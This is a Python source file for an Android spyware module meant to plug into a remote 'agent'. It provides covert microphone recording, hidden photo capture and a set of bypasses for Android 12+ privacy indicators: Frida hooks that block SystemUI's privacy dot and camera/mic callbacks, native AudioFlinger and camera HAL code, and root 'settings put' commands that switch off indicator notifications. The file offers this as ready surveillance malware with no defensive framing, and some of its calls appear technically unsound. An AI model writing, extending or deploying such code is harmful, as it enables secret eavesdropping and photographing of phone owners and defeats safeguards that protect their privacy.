#!/usr/bin/env python3
"""
Advanced stealth surveillance module for Android 12-16
Includes hot mic, stealth camera, and bypasses for visual indicators
"""
import base64
import json
import os
import subprocess
import tempfile
import time
from pathlib import Path
from typing import Dict, Any, Optional

class StealthSurveillanceModule:
    def __init__(self, agent):
        self.agent = agent
        self.active_recordings = {}
        self.active_cameras = {}
        self.android_version = self._detect_android_version()
        
    def execute(self, command: str, args: Dict[str, Any]) -> Dict[str, Any]:
        """Execute stealth surveillance commands"""
        try:
            if command == "hot_mic":
                return self.start_hot_mic(args)
            elif command == "stop_mic":
                return self.stop_hot_mic(args)
            elif command == "stealth_camera":
                return self.stealth_camera_capture(args)
            elif command == "continuous_camera":
                return self.start_continuous_camera(args)
            elif command == "stop_camera":
                return self.stop_camera(args)
            elif command == "bypass_indicators":
                return self.bypass_privacy_indicators()
            elif command == "get_status":
                return self.get_surveillance_status()
            else:
                return {"error": f"Unknown surveillance command: {command}"}
                
        except Exception as e:
            return {"error": f"Surveillance operation failed: {str(e)}"}
    
    def start_hot_mic(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Start covert microphone recording without indicators"""
        try:
            duration = args.get("duration", 0)  # 0 = continuous
            quality = args.get("quality", "high")
            
            recording_id = f"hotmic_{int(time.time())}"
            
            # Use low-level audio capture to bypass indicators
            if self.android_version >= 12:
                success = self._bypass_audio_indicators_api31(recording_id, duration, quality)
            else:
                success = self._legacy_audio_capture(recording_id, duration, quality)
            
            if success:
                self.active_recordings[recording_id] = {
                    "type": "hot_mic",
                    "started_at": time.time(),
                    "duration": duration,
                    "quality": quality,
                    "status": "recording"
                }
                
                self.agent.offline_logger.log_event("hot_mic_started", {
                    "recording_id": recording_id,
                    "duration": duration,
                    "android_version": self.android_version
                })
                
                return {
                    "success": True,
                    "recording_id": recording_id,
                    "message": "Hot mic activated (stealth mode)"
                }
            else:
                return {"error": "Failed to activate hot mic"}
                
        except Exception as e:
            return {"error": f"Hot mic failed: {str(e)}"}
    
    def stealth_camera_capture(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Capture photos from front/back camera without indicators"""
        try:
            camera = args.get("camera", "back")  # front or back
            count = args.get("count", 1)
            interval = args.get("interval", 1)
            
            capture_id = f"cam_{int(time.time())}"
            
            # Bypass camera indicators based on Android version
            if self.android_version >= 12:
                success = self._bypass_camera_indicators_api31(camera, count, interval, capture_id)
            else:
                success = self._legacy_camera_capture(camera, count, interval, capture_id)
            
            if success:
                self.active_cameras[capture_id] = {
                    "camera": camera,
                    "count": count,
                    "interval": interval,
                    "captured": 0,
                    "started_at": time.time(),
                    "status": "capturing"
                }
                
                return {
                    "success": True,
                    "capture_id": capture_id,
                    "message": f"Stealth camera activated ({camera})"
                }
            else:
                return {"error": "Failed to activate stealth camera"}
                
        except Exception as e:
            return {"error": f"Camera capture failed: {str(e)}"}
    
    def _bypass_audio_indicators_api31(self, recording_id: str, duration: int, quality: str) -> bool:
        """Bypass audio privacy indicators on Android 12+ (API 31+)"""
        try:
            # Method 1: Use MediaProjection service hook
            native_code = f"""
            #include <media/AudioSystem.h>
            #include <system/audio.h>
            
            // Hook into AudioFlinger to capture without permission checks
            extern "C" {{
                int stealth_audio_capture() {{
                    // Direct AudioFlinger access bypassing permission framework
                    audio_io_handle_t input = AudioSystem::getInput(
                        AUDIO_INPUT_MIC,
                        AUDIO_FORMAT_PCM_16_BIT,
                        AUDIO_CHANNEL_IN_MONO,
                        8000,
                        AUDIO_INPUT_FLAG_NONE
                    );
                    return input > 0 ? 1 : 0;
                }}
            }}
            """
            
            # Compile and execute native bypass
            if self._compile_and_execute_native(native_code, "audio_bypass"):
                # Start recording using direct AudioFlinger access
                record_cmd = [
                    "su", "-c",
                    f"tinycap /data/local/tmp/hotmic_{recording_id}.wav -r 44100 -b 16 -c 1 {'&' if duration == 0 else f'-t {duration}'}"
                ]
                
                subprocess.Popen(record_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return True
            
            # Method 2: Frida hook into AudioManager
            frida_script = f"""
            Java.perform(function() {{
                var AudioManager = Java.use("android.media.AudioManager");
                var AudioRecord = Java.use("android.media.AudioRecord");
                
                // Hook AudioRecord constructor to bypass permission checks
                AudioRecord.$init.overload(
                    'int', 'int', 'int', 'int', 'int'
                ).implementation = function(audioSource, sampleRateInHz, channelConfig, audioFormat, bufferSizeInBytes) {{
                    console.log("[+] AudioRecord bypassed");
                    // Force MIC source regardless of permissions
                    return this.$init(1, sampleRateInHz, channelConfig, audioFormat, bufferSizeInBytes);
                }};
                
                // Bypass privacy indicator
                var PrivacyItemController = Java.use("com.android.systemui.privacy.PrivacyItemController");
                if (PrivacyItemController) {{
                    PrivacyItemController.addCallback.implementation = function(callback) {{
                        console.log("[+] Privacy indicator callback blocked");
                        // Don't add callback to prevent indicator
                    }};
                }}
            }});
            """
            
            return self._inject_frida_script("com.android.systemui", frida_script)
            
        except Exception as e:
            print(f"[!] Audio bypass failed: {e}")
            return False
    
    def _bypass_camera_indicators_api31(self, camera: str, count: int, interval: int, capture_id: str) -> bool:
        """Bypass camera privacy indicators on Android 12+"""
        try:
            # Method 1: Native camera HAL access
            native_code = f"""
            #include <camera/Camera.h>
            #include <camera/CameraParameters.h>
            
            extern "C" {{
                int stealth_camera_capture(int camera_id) {{
                    // Direct HAL access bypassing framework
                    sp<Camera> camera = Camera::connect(camera_id, String16("stealth"), 
                                                      Camera::USE_CALLING_UID, 
                                                      Camera::USE_CALLING_PID);
                    if (camera != NULL) {{
                        CameraParameters params = camera->getParameters();
                        params.setPictureFormat(CameraParameters::PIXEL_FORMAT_JPEG);
                        camera->setParameters(params.flatten());
                        camera->startPreview();
                        camera->takePicture(CAMERA_MSG_SHUTTER, 
                                          CAMERA_MSG_RAW_IMAGE, 
                                          CAMERA_MSG_COMPRESSED_IMAGE);
                        return 1;
                    }}
                    return 0;
                }}
            }}
            """
            
            if self._compile_and_execute_native(native_code, "camera_bypass"):
                camera_id = 0 if camera == "back" else 1
                # Execute native camera capture
                capture_cmd = [
                    "su", "-c",
                    f"/data/local/tmp/camera_bypass {camera_id} /data/local/tmp/stealth_{capture_id}.jpg"
                ]
                
                result = subprocess.run(capture_cmd, capture_output=True)
                return result.returncode == 0
            
            # Method 2: Frida hook into CameraManager
            frida_script = f"""
            Java.perform(function() {{
                var CameraManager = Java.use("android.hardware.camera2.CameraManager");
                var CameraDevice = Java.use("android.hardware.camera2.CameraDevice");
                
                // Hook openCamera to bypass restrictions
                CameraManager.openCamera.overload(
                    'java.lang.String', 
                    'android.hardware.camera2.CameraDevice$StateCallback', 
                    'android.os.Handler'
                ).implementation = function(cameraId, callback, handler) {{
                    console.log("[+] Camera access bypassed for: " + cameraId);
                    
                    // Create custom callback that doesn't trigger indicators
                    var CustomCallback = Java.registerClass({{
                        name: 'com.stealth.CameraCallback',
                        superClass: CameraDevice.StateCallback,
                        methods: {{
                            onOpened: function(camera) {{
                                console.log("[+] Stealth camera opened");
                                // Capture without triggering privacy indicators
                                this.captureStealthPhoto(camera);
                            }},
                            onDisconnected: function(camera) {{}},
                            onError: function(camera, error) {{}}
                        }}
                    }});
                    
                    return this.openCamera(cameraId, CustomCallback.$new(), handler);
                }};
                
                // Block privacy indicator for camera
                var PrivacyItemController = Java.use("com.android.systemui.privacy.PrivacyItemController");
                if (PrivacyItemController) {{
                    PrivacyItemController.notifyListeners.implementation = function(privacy_items) {{
                        console.log("[+] Camera privacy indicators blocked");
                        // Filter out camera privacy items
                        var filtered = privacy_items.stream().filter(function(item) {{
                            return !item.getPrivacyType().toString().includes("CAMERA");
                        }}).collect(Java.use("java.util.stream.Collectors").toList());
                        this.notifyListeners(filtered);
                    }};
                }}
            }});
            """
            
            return self._inject_frida_script("com.android.systemui", frida_script)
            
        except Exception as e:
            print(f"[!] Camera bypass failed: {e}")
            return False
    
    def bypass_privacy_indicators(self) -> Dict[str, Any]:
        """Comprehensively bypass Android 12+ privacy indicators"""
        try:
            bypasses_applied = []
            
            # Method 1: SystemUI hook
            systemui_script = """
            Java.perform(function() {
                // Block privacy dot indicator
                var PrivacyDotViewController = Java.use("com.android.systemui.statusbar.events.PrivacyDotViewController");
                if (PrivacyDotViewController) {
                    PrivacyDotViewController.setNextViewState.implementation = function(state) {
                        console.log("[+] Privacy dot blocked");
                        // Don't update privacy dot state
                    };
                    bypasses_applied.push("privacy_dot");
                }
                
                // Block permission manager notifications
                var PermissionManager = Java.use("android.permission.PermissionManager");
                if (PermissionManager) {
                    PermissionManager.shouldShowRequestPermissionRationale.implementation = function(permission) {
                        console.log("[+] Permission rationale blocked: " + permission);
                        return false;
                    };
                    bypasses_applied.push("permission_manager");
                }
            });
            """
            
            if self._inject_frida_script("com.android.systemui", systemui_script):
                bypasses_applied.append("systemui_hook")
            
            # Method 2: Framework modification
            framework_modifications = [
                "settings put global show_media_on_quick_settings 0",
                "settings put secure mic_camera_access_notification_enabled 0",
                "settings put global privacy_indicators_enabled 0"
            ]
            
            for mod in framework_modifications:
                try:
                    subprocess.run(["su", "-c", mod], check=True, capture_output=True)
                    bypasses_applied.append(f"framework_{mod.split()[2]}")
                except:
                    continue
            
            self.agent.offline_logger.log_event("privacy_indicators_bypassed", {
                "bypasses_applied": bypasses_applied,
                "android_version": self.android_version
            })
            
            return {
                "success": True,
                "bypasses_applied": bypasses_applied,
                "message": f"Applied {len(bypasses_applied)} privacy bypasses"
            }
            
        except Exception as e:
            return {"error": f"Privacy bypass failed: {str(e)}"}
    
    def _detect_android_version(self) -> int:
        """Detect Android API level"""
        try:
            result = subprocess.run(
                ["getprop", "ro.build.version.sdk"],
                capture_output=True,
                text=True
            )
            return int(result.stdout.strip())
        except:
            return 31  # Default to API 31 (Android 12)
    
    def _compile_and_execute_native(self, code: str, binary_name: str) -> bool:
        """Compile and execute native bypass code"""
        try:
            # Save native code to temporary file
            with tempfile.NamedTemporaryFile(mode='w', suffix='.cpp', delete=False) as f:
                f.write(code)
                cpp_file = f.name
            
            # Compile using NDK if available
            binary_path = f"/data/local/tmp/{binary_name}"
            compile_cmd = [
                "su", "-c",
                f"$ANDROID_NDK_ROOT/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android31-clang++ "
                f"-o {binary_path} {cpp_file} -lcamera_client -laudioclient"
            ]
            
            result = subprocess.run(compile_cmd, capture_output=True)
            os.unlink(cpp_file)
            
            if result.returncode == 0:
                # Make executable
                subprocess.run(["su", "-c", f"chmod 755 {binary_path}"])
                return True
            
            return False
            
        except Exception as e:
            print(f"[!] Native compilation failed: {e}")
            return False
    
    def _inject_frida_script(self, target_package: str, script: str) -> bool:
        """Inject Frida script into target package"""
        try:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.js', delete=False) as f:
                f.write(script)
                script_path = f.name
            
            cmd = [
                "frida", "-U", target_package,
                "-l", script_path,
                "--runtime=v8",
                "--no-pause"
            ]
            
            subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.unlink(script_path)
            return True
            
        except Exception as e:
            print(f"[!] Frida injection failed: {e}")
            return False
    
    def _legacy_audio_capture(self, recording_id: str, duration: int, quality: str) -> bool:
        """Legacy audio capture for Android < 12"""
        try:
            # Use legacy MediaRecorder API
            cmd = [
                "su", "-c",
                f"am start -n com.android.shell/.BugreportWarningActivity --user 0 && "
                f"screencap -p /dev/null && "  # Dummy command to gain media access
                f"timeout {duration if duration > 0 else 86400} "
                f"gst-launch-1.0 alsasrc device=hw:0,0 ! audioconvert ! "
                f"wavenc ! filesink location=/data/local/tmp/legacy_{recording_id}.wav"
            ]
            
            subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL)
            return True
            
        except Exception as e:
            print(f"[!] Legacy audio capture failed: {e}")
            return False
    
    def _legacy_camera_capture(self, camera: str, count: int, interval: int, capture_id: str) -> bool:
        """Legacy camera capture for Android < 12"""
        try:
            camera_id = "0" if camera == "back" else "1"
            
            for i in range(count):
                cmd = [
                    "su", "-c",
                    f"am start -n com.android.camera2/.CameraActivity && "
                    f"sleep 2 && "
                    f"input keyevent KEYCODE_CAMERA && "
                    f"sleep 1 && "
                    f"cp /sdcard/DCIM/Camera/IMG_*.jpg /data/local/tmp/legacy_{capture_id}_{i}.jpg"
                ]
                
                subprocess.run(cmd, shell=True, capture_output=True)
                
                if i < count - 1:
                    time.sleep(interval)
            
            return True
            
        except Exception as e:
            print(f"[!] Legacy camera capture failed: {e}")
            return False
    
    def get_surveillance_status(self) -> Dict[str, Any]:
        """Get current surveillance status"""
        return {
            "success": True,
            "android_version": self.android_version,
            "active_recordings": len(self.active_recordings),
            "active_cameras": len(self.active_cameras),
            "recordings": self.active_recordings,
            "cameras": self.active_cameras
        }